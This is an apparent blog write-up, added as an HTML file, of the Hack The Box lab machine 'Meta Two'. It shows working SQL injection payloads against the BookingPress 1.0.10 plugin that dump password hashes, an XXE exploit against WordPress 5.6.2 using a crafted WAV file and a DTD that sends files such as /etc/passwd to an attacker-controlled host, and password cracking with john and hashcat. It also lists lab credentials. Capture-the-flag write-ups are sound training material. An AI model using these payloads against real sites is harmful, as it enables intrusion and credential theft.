@@ -1,0 +1,204 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Meta Two [Easy] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Meta Two [Easy]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.65.154 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp? syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://metapress."/>
+
+    <meta property="og:title" content="HTB - Meta Two [Easy]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.65.154 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp? syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://metapress." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/metatwo/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-10-30T21:32:38+13:00" />
+<meta property="article:modified_time" content="2022-10-30T21:32:38+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Meta Two [Easy]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 30, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.65.154 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp?    syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://metapress.htb/
+|_http-server-header: nginx/1.18.0
+</code></pre><ul>
+<li>Add <code>metapress.htb</code> to <code>/etc/hosts</code></li>
+<li>21 ftp requires credential, nothing to do for now</li>
+<li>Try 80, this appears to be a WordPress site.</li>
+</ul>
+<h1 id="web-enum">Web Enum</h1>
+<pre tabindex="0"><code>wpscan --url http://metapress.htb -e p,u --plugins-detection aggressive
+</code></pre><ul>
+<li>There is a booking app at <code>http://metapress.htb/events/</code></li>
+</ul>
+<pre tabindex="0"><code># Make a booking and received an appointment id
+http://metapress.htb/thank-you/?appointment_id=MQ==
+
+# Inspecting the source of the page found several references as follow
+&lt;link rel=&#39;stylesheet&#39; id=&#39;bookingpress_tel_input-css&#39;  href=&#39;http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10&#39; media=&#39;all&#39; /&gt;
+</code></pre><ul>
+<li>This booking app is <code>BookingPress</code> version <code>1.0.10</code></li>
+<li>Searching for exploits lead to this: <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></li>
+</ul>
+<h1 id="sqli">SQLi</h1>
+<ul>
+<li>As describe, we need to get a valid nonce to work with. This can be found be creating an event using BookingPress, and in the network traffic, there is a new parameter called <code>_wpnonce</code> where you can get the nonce value.</li>
+<li>Then, follow the example payload from the link to test the theory.</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=ad24ffd7e3&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;
+
+[{&#34;bookingpress_service_id&#34;:&#34;10.5.15-MariaDB-0+deb11u1&#34;,&#34;bookingpress_category_id&#34;:&#34;Debian 11&#34;,&#34;bookingpress_service_name&#34;:&#34;debian-linux-gnu&#34;,&#34;bookingpress_service_price&#34;:&#34;$1.00&#34;,&#34;bookingpress_service_duration_val&#34;:&#34;2&#34;,&#34;bookingpress_service_duration_unit&#34;:&#34;3&#34;,&#34;bookingpress_service_description&#34;:&#34;4&#34;,&#34;bookingpress_service_position&#34;:&#34;5&#34;,&#34;bookingpress_servicedate_created&#34;:&#34;6&#34;,&#34;service_price_without_currency&#34;:1,&#34;img_url&#34;:&#34;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&#34;}]
+</code></pre><ul>
+<li>Note that the vervion value and version comment can be extracted and returned on <code>bookingpress_service_id</code> and <code>bookingpress_category_id</code></li>
+<li>Trial and error with sqli techniques and eventually lead to the following credentials in the database</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=ad24ffd7e3&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -&#39;
+
+[{&#34;bookingpress_service_id&#34;:&#34;admin,manager&#34;,&#34;bookingpress_category_id&#34;:&#34;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70&#34;,&#34;bookingpress_service_name&#34;:&#34;debian-linux-gnu&#34;,&#34;bookingpress_service_price&#34;:&#34;$1.00&#34;,&#34;bookingpress_service_duration_val&#34;:&#34;2&#34;,&#34;bookingpress_service_duration_unit&#34;:&#34;3&#34;,&#34;bookingpress_service_description&#34;:&#34;4&#34;,&#34;bookingpress_service_position&#34;:&#34;5&#34;,&#34;bookingpress_servicedate_created&#34;:&#34;6&#34;,&#34;service_price_without_currency&#34;:1,&#34;img_url&#34;:&#34;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&#34;}] 
+</code></pre><h1 id="hash-cracking">Hash cracking</h1>
+<ul>
+<li>Crack the hashes, note that the second hash has a leading <code>\</code> for character escaping, remove it before cracking. <code>manager</code> password can be cracked: <code>partylikearockstar</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe -m 400 -a 0 hash.txt rockyou.txt
+</code></pre><h1 id="foothold">Foothold</h1>
+<ul>
+<li>Login to <code>http://metapress.htb/wp-admin/</code> using the previously cracked credential</li>
+<li>After login, we learnt the wordpress version is <code>5.6.2</code>: <a href="http://metapress.htb/wp-admin/about.php">http://metapress.htb/wp-admin/about.php</a></li>
+<li>There are multiple vulnerabilities in this version: <a href="https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/">https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/</a></li>
+<li>Try this exploit: <a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></li>
+</ul>
+<pre tabindex="0"><code># Run the web server
+&gt; make up-mal
+
+# Change the content in attacker/www/evil.dtd to match your ip
+&lt;!ENTITY % file SYSTEM &#34;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;
+&lt;!ENTITY % init &#34;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http://&lt;ip&gt;:8001/?p=%file;&#39;&gt;&#34; &gt;
+
+# Generate a malicious payload
+&gt; echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&#34;&#39;&#34;&#39;http://&lt;ip&gt;:8001/evil.dtd&#39;&#34;&#39;&#34;&#39;&gt;%remote;%init;%trick;] &gt;\x00&#39;&gt; malicious.wav
+
+# Upload the .wav file to http://metapress.htb/wp-admin/upload.php and receive the returned results
+[Sun Oct 30 17:06:01 2022] 10.129.65.154:54694 [404]: GET /?p=&lt;base64_zipped&gt; - No such file or directory
+
+# Then decode and upzip the result
+&lt;?php
+echo zlib_decode(base64_decode(&#39;&lt;returned_value&gt;&#39;));
+?&gt;
+</code></pre><ul>
+<li>We learnt that there is a user at <code>/home/jnelson</code></li>
+<li>Now, we have a way to read file on the target, then we can attempt several reads hopefully to find the user&rsquo;s password some where. To change the file being read, just change the <code>attacker/www/evil.dtd</code> file and upload the .wav payload.</li>
+</ul>
+<pre tabindex="0"><code># Read /etc/nginx/sites-enabled/default to locate the website folder
+root /var/www/metapress.htb/blog;
+
+# Read wordpres config file /var/www/metapress.htb/blog/wp-config.php
+define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+define( &#39;FTP_SSL&#39;, false );
+</code></pre><ul>
+<li>We have the credential for ftp, login to ftp</li>
+</ul>
+<pre tabindex="0"><code>&gt; ftp ftp.metapress.htb
+
+# Check the content of send_email.php
+$mail-&gt;Host = &#34;mail.metapress.htb&#34;;
+$mail-&gt;SMTPAuth = true;                          
+$mail-&gt;Username = &#34;jnelson@metapress.htb&#34;;                 
+$mail-&gt;Password = &#34;Cb4_JmWM8zUZWMu@Ys&#34;;                           
+$mail-&gt;SMTPSecure = &#34;tls&#34;;                           
+$mail-&gt;Port = 587;
+</code></pre><ul>
+<li>Login as <code>jnelson</code> to get the user flag</li>
+</ul>
+<h1 id="pe">PE</h1>
+<ul>
+<li>Upload linpeas, note there is a passpie process, which corresponds to a password manager app: <a href="https://github.com/marcwebbie/passpie">https://github.com/marcwebbie/passpie</a></li>
+</ul>
+<pre tabindex="0"><code>[i] Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+6061      sed-Es,/dev/mqueue|/dev/shm|/home/jnelson|/home/jnelson/.local|/home/jnelson/.local/share|/home/jnelson/.local/share/nano|/home/jnelson/.passpie|/home/jnelson/.passpie/ssh|/run/lock|/run/user/1000|/run/user/1000/systemd|/run/user/1000/systemd/inaccessible|/run/user/1000/systemd/inaccessible/dir|/tmp|/tmp/.font-unix|/tmp/.ICE-unix|/tmp/.Test-unix|/tmp/.X11-unix|/tmp/.XIM-unix|/var/lib/php/sessions|/var/tmp
+</code></pre><ul>
+<li>There is a pgp private key file, copy only the <code>private</code> key part of the file</li>
+</ul>
+<pre tabindex="0"><code>[+] Searching ssl/ssh files
+Possible private SSH keys were found!
+/home/jnelson/.passpie/.keys
+</code></pre><ul>
+<li>Crack the private key</li>
+</ul>
+<pre tabindex="0"><code># Convert to john crackable format
+&gt; gpg2john private.key &gt; hash
+# Crack using john
+&gt; john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre><ul>
+<li>Get root password from passpie and PE to root to get the flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; passpie copy ssh --to stdout
+Passphrase: 
+p7qfAZt4_A1xo_0x
+&gt; su
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
